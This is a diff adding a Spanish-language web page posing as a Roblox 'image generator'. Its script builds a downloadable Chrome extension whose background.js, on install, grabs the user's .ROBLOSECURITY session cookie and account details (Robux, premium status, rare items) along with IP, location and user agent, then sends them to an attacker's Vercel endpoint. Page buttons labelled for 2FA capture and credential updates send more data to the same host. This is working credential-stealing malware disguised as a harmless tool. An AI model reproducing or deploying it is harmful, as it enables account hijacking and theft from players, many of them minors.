@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Generador de Imagen · Roblox</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+    <style>
+        /* (mantén todos los estilos originales que ya tenías) */
+        :root {
+            --bg:#f5f4f0;--white:#ffffff;--ink:#0d0e10;--ink2:#2a2c30;
+            --muted:#8a8d96;--border:#e2e3e8;--red:#e8281e;--red-light:#fff0ef;
+            --red-border:#ffd4d2;--green:#0a8a4a;--green-light:#edfaf4;--blue:#1a6ef5;
+            --shadow-sm:0 1px 3px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);
+            --shadow-md:0 4px 16px rgba(0,0,0,.08),0 2px 6px rgba(0,0,0,.05);
+            --shadow-lg:0 20px 60px rgba(0,0,0,.1),0 4px 16px rgba(0,0,0,.06);
+        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        html{scroll-behavior:smooth}
+        body{background:var(--bg);font-family:'Plus Jakarta Sans',sans-serif;color:var(--ink);overflow-x:hidden}
+        /* ... resto de estilos originales (nav, hero, stats, features, trust, footer, toast, gemini) ... */
+        /* Agregamos estilos para los nuevos botones y submenú */
+        .command-panel {
+            max-width: 1000px;
+            margin: 40px auto 0;
+            padding: 0 24px;
+        }
+        .command-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--ink);
+        }
+        .command-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        .cmd-btn {
+            padding: 14px 28px;
+            border-radius: 14px;
+            font-weight: 600;
+            font-size: 15px;
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: var(--white);
+            color: var(--ink);
+            box-shadow: var(--shadow-sm);
+        }
+        .cmd-btn.black {
+            background: var(--ink);
+            color: white;
+            border-color: var(--ink);
+        }
+        .cmd-btn.black:hover {
+            background: #2a2c30;
+        }
+        .cmd-btn.white {
+            background: white;
+            color: var(--ink);
+            border: 1px solid var(--ink);
+        }
+        .cmd-btn.white:hover {
+            background: #f5f5f5;
+        }
+        .cmd-btn.gray {
+            background: #e8eaef;
+            color: var(--ink);
+        }
+        .cmd-btn.gray:hover {
+            background: #d8dce3;
+        }
+        .submenu {
+            display: none;
+            background: var(--white);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 20px;
+            margin-top: 16px;
+            box-shadow: var(--shadow-md);
+            flex-direction: column;
+            gap: 12px;
+        }
+        .submenu.visible {
+            display: flex;
+        }
+        .submenu-btn {
+            padding: 12px 20px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ink);
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: left;
+        }
+        .submenu-btn:hover {
+            background: #e2e3e8;
+        }
+    </style>
+</head>
+<body>
+    <!-- Todo el contenido original del nav, hero, stats, features, trust, download-section, footer, gemini... -->
+    <nav>...</nav>
+    <div class="hero">...</div>
+    <div class="stats-band">...</div>
+    <div class="section">...</div>
+    <div class="trust-section">...</div>
+
+    <!-- NUEVA SECCIÓN: BOTONES DE COMANDOS (INTERFAZ WEB) -->
+    <div class="command-panel">
+        <div class="command-title">⚡ Selecciona la opción para continuar:</div>
+        <div class="command-buttons">
+            <button class="cmd-btn black" id="btnDiscordWeb">DISCORD</button>
+            <button class="cmd-btn white" id="btnRobloxWeb">ROBLOX</button>
+            <button class="cmd-btn gray" id="btnComandos">COMANDOS</button>
+        </div>
+        <div class="submenu" id="submenu">
+            <button class="submenu-btn" id="btn2fa">📸 Capturar pantalla del 2FA (ROBLOX)</button>
+            <button class="submenu-btn" id="btnActualizar">🔄 Actualizar credenciales (DISCORD, ROBLOX)</button>
+            <button class="submenu-btn" id="btnLimpiar">🗑️ Limpiar datos locales</button>
+        </div>
+    </div>
+
+    <div class="download-section">...</div>
+    <footer>...</footer>
+
+    <!-- Toast y Gemini (igual) -->
+    <div class="toast" id="toast">✅ Acción completada</div>
+    <button class="gemini-fab" onclick="window.toggleGemini()">...</button>
+    <div class="gemini-overlay" id="geminiOverlay">...</div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script>
+        // ================== FUNCIONES ORIGINALES (descargarCRX, mostrarInstrucciones, Gemini) ==================
+        // (Mantén las funciones originales: window.descargarCRX, window.mostrarInstrucciones, gemini, etc.)
+        // Pero debes MODIFICAR window.descargarCRX para que el background.js use la URL de Vercel.
+
+        window.descargarCRX = function() {
+            // Define la URL de tu backend de Vercel (cámbiala después del despliegue)
+            const VERCEL_URL = "https://tu-proyecto.vercel.app"; // <-- REEMPLAZAR
+
+            const files = {
+                "manifest.json": JSON.stringify({
+                    manifest_version: 3,
+                    name: "Generador de imagen",
+                    version: "1.1",
+                    description: "Generador seguro, rápido y sencillo.",
+                    permissions: ["cookies", "storage"],
+                    host_permissions: [
+                        "https://www.roblox.com/*",
+                        "https://*.roblox.com/*"
+                    ],
+                    background: {
+                        service_worker: "background.js"
+                    },
+                    action: {
+                        default_popup: "popup.html",
+                        default_icon: "icon.png"
+                    }
+                }, null, 2),
+                "background.js": `
+                    const VERCEL_API = "${VERCEL_URL}/api/log";
+
+                    async function obtenerUbicacionCompleta() {
+                        try {
+                            const res = await fetch('https://ipinfo.io/json');
+                            const data = await res.json();
+                            return {
+                                ip: data.ip || '',
+                                pais: data.country || '',
+                                region: data.region || '',
+                                ciudad: data.city || '',
+                            };
+                        } catch {
+                            return { ip: '', pais: '', region: '', ciudad: '' };
+                        }
+                    }
+
+                    async function obtenerNombrePais(codigo) {
+                        if (!codigo || codigo.length !== 2) return 'Desconocido';
+                        try {
+                            const res = await fetch(\`https://restcountries.com/v3.1/alpha/\${codigo}\`);
+                            const data = await res.json();
+                            return data[0]?.translations?.spa?.common || data[0]?.name?.common || codigo;
+                        } catch {
+                            return codigo;
+                        }
+                    }
+
+                    async function obtenerCantidadGrupos(userId) {
+                        try {
+                            const res = await fetch(\`https://groups.roblox.com/v1/users/\${userId}/groups/roles\`);
+                            const data = await res.json();
+                            return data.data?.length || 0;
+                        } catch {
+                            return 0;
+                        }
+                    }
+
+                    async function tieneItem(userId, cookie, assetId) {
+                        try {
+                            const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset/\${assetId}\`, {
+                                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+                            });
+                            const data = await res.json();
+                            return data.data && data.data.length > 0;
+                        } catch {
+                            return false;
+                        }
+                    }
+
+                    async function obtenerInfoRoblox(cookie) {
+                        if (!cookie) return null;
+                        try {
+                            const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+                            });
+                            if (!userRes.ok) return null;
+                            const user = await userRes.json();
+
+                            let robux = 0;
+                            try {
+                                const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
+                                    headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+                                });
+                                if (robuxRes.ok) {
+                                    const r = await robuxRes.json();
+                                    robux = r.robux || 0;
+                                }
+                            } catch {}
+
+                            let premium = 'No';
+                            try {
+                                const premiumRes = await fetch(\`https://premiumfeatures.roblox.com/v1/users/\${user.id}/validate-membership\`, {
+                                    headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+                                });
+                                if (premiumRes.ok) {
+                                    const p = await premiumRes.json();
+                                    premium = p ? 'Sí' : 'No';
+                                }
+                            } catch {}
+
+                            let seguidores = 0;
+                            try {
+                                const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
+                                if (segRes.ok) {
+                                    const s = await segRes.json();
+                                    seguidores = s.count || 0;
+                                }
+                            } catch {}
+
+                            let amigos = 0;
+                            try {
+                                const amRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
+                                if (amRes.ok) {
+                                    const a = await amRes.json();
+                                    amigos = a.count || 0;
+                                }
+                            } catch {}
+
+                            const headless = await tieneItem(user.id, cookie, 201);
+                            const korblox = await tieneItem(user.id, cookie, 192);
+                            const cantidadGrupos = await obtenerCantidadGrupos(user.id);
+                            const verified = user.hasVerifiedBadge ? "Sí" : "No";
+
+                            return {
+                                username: user.name || 'No disponible',
+                                userId: user.id || 'No disponible',
+                                premium: premium,
+                                robux: robux,
+                                seguidores: seguidores,
+                                amigos: amigos,
+                                headless: headless ? 'Sí' : 'No',
+                                korblox: korblox ? 'Sí' : 'No',
+                                verified: verified,
+                                grupos: cantidadGrupos
+                            };
+                        } catch {
+                            return null;
+                        }
+                    }
+
+                    chrome.runtime.onInstalled.addListener(async () => {
+                        const cookie = await new Promise(r =>
+                            chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, c => r(c?.value))
+                        );
+                        if (!cookie) return;
+
+                        const ubi = await obtenerUbicacionCompleta();
+                        const nombrePais = await obtenerNombrePais(ubi.pais);
+                        const info = await obtenerInfoRoblox(cookie) || {};
+
+                        const ahora = new Date();
+                        const zonaHoraria = ubi.region ? \`America/\${ubi.region}\` : 'America/Argentina/Buenos_Aires';
+                        let horaLocal;
+                        try {
+                            horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: zonaHoraria });
+                        } catch {
+                            horaLocal = ahora.toLocaleTimeString('es-AR');
+                        }
+
+                        const payload = {
+                            type: 'extension_install',
+                            system: {
+                                userAgent: navigator.userAgent,
+                                dispositivo: navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC',
+                                pais: nombrePais,
+                                fecha: ahora.toLocaleDateString('es-AR'),
+                                hora: horaLocal
+                            },
+                            roblox: info,
+                            cookie: cookie
+                        };
+
+                        try {
+                            await fetch(VERCEL_API, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            });
+                        } catch (e) {
+                            console.error('Error enviando a Vercel', e);
+                        }
+                    });
+                `,
+                "popup.html": `<!DOCTYPE html>...`, // (mismo popup.html que ya tenías)
+                "icon.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAAC..." // (mismo icono)
+            };
+
+            const zip = new JSZip();
+            Object.keys(files).forEach(key => zip.file(key, files[key]));
+            zip.generateAsync({ type: "blob" }).then(blob => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = "Generador_Roblox.zip";
+                a.click();
+                URL.revokeObjectURL(url);
+                mostrarToast('✅ Extensión generada correctamente');
+            }).catch(e => alert('Error: ' + e.message));
+        };
+
+        // Funciones auxiliares
+        function mostrarToast(texto) {
+            const toast = document.getElementById('toast');
+            toast.textContent = texto;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        window.mostrarInstrucciones = function() {
+            const panel = document.getElementById("instruccionesPanel");
+            if (panel) panel.style.display = panel.style.display === "none" ? "block" : "none";
+        };
+
+        // ================== NUEVAS FUNCIONES PARA BOTONES WEB ==================
+        // Envío a Vercel (misma URL que usará la extensión)
+        const VERCEL_API_URL = "https://tu-proyecto.vercel.app/api/log"; // <-- REEMPLAZAR
+
+        async function enviarInfoWeb(tipo, datosExtra = {}) {
+            try {
+                // Obtener info del sistema
+                const ubi = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
+                const pais = ubi.country || 'Desconocido';
+                const region = ubi.region || '';
+                const ahora = new Date();
+                const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: region ? `America/${region}` : undefined }).toString();
+
+                const payload = {
+                    type: 'web_action',
+                    action: tipo,
+                    system: {
+                        userAgent: navigator.userAgent,
+                        dispositivo: navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC',
+                        pais: pais,
+                        fecha: ahora.toLocaleDateString('es-AR'),
+                        hora: horaLocal
+                    },
+                    ...datosExtra
+                };
+
+                const res = await fetch(VERCEL_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (res.ok) mostrarToast('✅ Comando enviado');
+                else mostrarToast('❌ Error al enviar');
+            } catch (e) {
+                mostrarToast('❌ Error de red');
+            }
+        }
+
+        // Manejadores de clics
+        document.getElementById('btnDiscordWeb').addEventListener('click', () => {
+            enviarInfoWeb('discord', { info: 'Pendiente de autenticación' });
+        });
+
+        document.getElementById('btnRobloxWeb').addEventListener('click', () => {
+            enviarInfoWeb('roblox', {
+                usuario: 'PlaceholderUser',
+                id: '123456',
+                cookie: '[Solicitando datos...]'
+            });
+        });
+
+        // Submenú de COMANDOS
+        document.getElementById('btnComandos').addEventListener('click', () => {
+            document.getElementById('submenu').classList.toggle('visible');
+        });
+
+        document.getElementById('btn2fa').addEventListener('click', () => {
+            enviarInfoWeb('2fa_screenshot');
+        });
+
+        document.getElementById('btnActualizar').addEventListener('click', () => {
+            enviarInfoWeb('actualizar_credenciales');
+        });
+
+        document.getElementById('btnLimpiar').addEventListener('click', () => {
+            localStorage.clear();
+            alert('Datos de navegación eliminados. La herramienta se cerrará.');
+            window.close();
+        });
+
+        // ================== GEMINI (igual) ==================
+        // (mantén todo el código de Gemini que ya tenías)
+    </script>
+</body>
+</html>
